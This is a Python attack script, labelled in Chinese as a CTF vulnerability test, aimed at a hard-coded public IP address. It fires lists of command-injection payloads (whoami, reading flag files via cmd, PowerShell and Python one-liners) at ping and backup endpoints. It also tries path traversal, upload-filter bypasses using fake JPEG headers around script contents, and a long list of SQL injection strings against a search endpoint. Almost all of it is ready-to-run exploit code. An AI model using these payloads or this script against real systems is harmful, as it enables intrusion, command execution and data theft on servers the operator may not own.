import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_ping_deep():
    """深入测试Ping命令执行"""
    print_section("1. 深入测试Ping命令执行")
    
    ping_url = f"{TARGET}/ping"
    
    ping_payloads = [
        # 尝试不同的Windows命令格式
        "127.0.0.1 & whoami",
        "127.0.0.1 & type F:\\flag.txt",
        "127.0.0.1 & type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1 & dir F:\\",
        "127.0.0.1 & dir F:\\small peoject",
        "127.0.0.1 & dir F:\\small peoject\\python-lab",
        # 使用&&
        "127.0.0.1 && whoami",
        "127.0.0.1 && type F:\\flag.txt",
        # 使用|
        "127.0.0.1 | whoami",
        "127.0.0.1 | type F:\\flag.txt",
        # 使用;
        "127.0.0.1; whoami",
        "127.0.0.1; type F:\\flag.txt",
        # 使用括号
        "(127.0.0.1) & whoami",
        "(127.0.0.1) && type F:\\flag.txt",
        # 使用引号
        "\"127.0.0.1\" & whoami",
        "'127.0.0.1' & whoami",
        # 尝试不带IP
        "& whoami",
        "& type F:\\flag.txt",
        "&& whoami",
        "&& type F:\\flag.txt",
        "| whoami",
        "| type F:\\flag.txt",
        ";whoami",
        ";type F:\\flag.txt",
        # 使用cmd /c
        "127.0.0.1; cmd /c whoami",
        "127.0.0.1; cmd /c type F:\\flag.txt",
        # 使用powershell
        "127.0.0.1; powershell -Command whoami",
        "127.0.0.1; powershell -Command \"type F:\\flag.txt\"",
        # 使用python
        "127.0.0.1; python -c \"print(open('F:\\flag.txt').read())\"",
        # 使用python3
        "127.0.0.1; python3 -c \"print(open('F:\\flag.txt').read())\"",
        # 使用py
        "127.0.0.1; py -c \"print(open('F:\\flag.txt').read())\"",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 100 or ("whoami" in body_content.lower()):
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:800]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_deep():
    """深入测试Backup命令执行"""
    print_section("2. 深入测试Backup命令执行")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        # 尝试不同的路径格式
        "F:\\small peoject\\python-lab\\uploads",
        "F:/small peoject/python-lab/uploads",
        # 尝试路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..",
        "F:\\small peoject\\python-lab\\uploads\\..\\..",
        "F:/small peoject/python-lab/uploads/..",
        "F:/small peoject/python-lab/uploads/../..",
        # 尝试命令注入
        "F:\\small peoject\\python-lab\\uploads & whoami",
        "F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads && whoami",
        "F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads | whoami",
        "F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads; whoami",
        "F:\\small peoject\\python-lab\\uploads; type F:\\flag.txt",
        # 使用cmd /c
        "F:\\small peoject\\python-lab\\uploads; cmd /c whoami",
        "F:\\small peoject\\python-lab\\uploads; cmd /c type F:\\flag.txt",
        # 使用powershell
        "F:\\small peoject\\python-lab\\uploads; powershell -Command whoami",
        "F:\\small peoject\\python-lab\\uploads; powershell -Command \"type F:\\flag.txt\"",
        # 使用python
        "F:\\small peoject\\python-lab\\uploads; python -c \"print(open('F:\\flag.txt').read())\"",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:800]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_upload_bypass():
    """测试上传绕过"""
    print_section("3. 测试上传绕过")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 根据提示，上传只检查扩展名黑名单和Content-Type
    # 让我尝试各种绕过方式
    
    test_files = [
        # 尝试上传.py文件，伪装Content-Type
        ("test.py", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09#!/usr/bin/env python\nprint('Hello World')\xff\xd9"),
        # 尝试上传.pyc文件
        ("test.pyc", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09\xff\xd9"),
        # 尝试上传.txt文件
        ("test.txt", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09test content\xff\xd9"),
        # 尝试上传.html文件
        ("test.html", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09<html><body>test</body></html>\xff\xd9"),
        # 尝试上传.xml文件
        ("test.xml", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09<?xml version='1.0'?><test>hello</test>\xff\xd9"),
        # 尝试上传.bat文件
        ("test.bat", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09@echo off\ntype F:\flag.txt\xff\xd9"),
        # 尝试上传.cmd文件
        ("test.cmd", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09@echo off\ntype F:\flag.txt\xff\xd9"),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     Content-Type: {r2.headers.get('Content-Type', '')}")
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_sql_bypass():
    """测试SQL注入绕过"""
    print_section("4. 测试SQL注入绕过")
    
    url = f"{TARGET}/search"
    
    sql_payloads = [
        # 尝试各种绕过方式
        "1' OR 1=1--",
        "1' OR '1'='1",
        "1' UNION SELECT 1,2,3",
        "1' UNION SELECT 1,version(),3",
        "1' UNION SELECT 1,database(),3",
        "' OR 1=1",
        "\" OR 1=1",
        "' OR 'a'='a",
        "\" OR \"a\"=\"a",
        "admin' --",
        "admin'#",
        # 尝试编码绕过
        "1' UNI/**/ON SEL/**/ECT 1,2,3",
        "1' UNION%20SELECT%201,2,3",
        "1'%20OR%201=1--",
        # 尝试大小写混淆
        "1' uNiOn sElEcT 1,2,3",
        "1' UnIoN SeLeCt 1,2,3",
        # 尝试其他方式
        "1' ORDER BY 1",
        "1' ORDER BY 2",
        "1' ORDER BY 3",
        "0' UNION SELECT 1,2,3",
        "-1' OR 1=1",
        "1' LIMIT 0,1",
        "1' OFFSET 1",
        # 尝试不同的引号
        "1 OR 1=1",
        "1 OR 1=1--",
        "1 AND 1=1",
        "1 AND 1=2",
        # 尝试特殊字符
        "'",
        "\"",
        "\\",
        "`",
        "--",
        "#",
        ";",
        "/*",
        "*/",
        "--+",
        "-- -",
    ]
    
    for payload in sql_payloads:
        try:
            r = session.get(url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<div class="results">(.*?)</div>', r.text, re.DOTALL)
                if body_match:
                    results_content = body_match.group(1)
                    
                    if len(results_content) > 50:
                        print(f"\n  [{r.status_code}] ?q={payload}")
                        print(f"     结果: {results_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', results_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_ping_deep()
    test_backup_deep()
    test_upload_bypass()
    test_sql_bypass()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()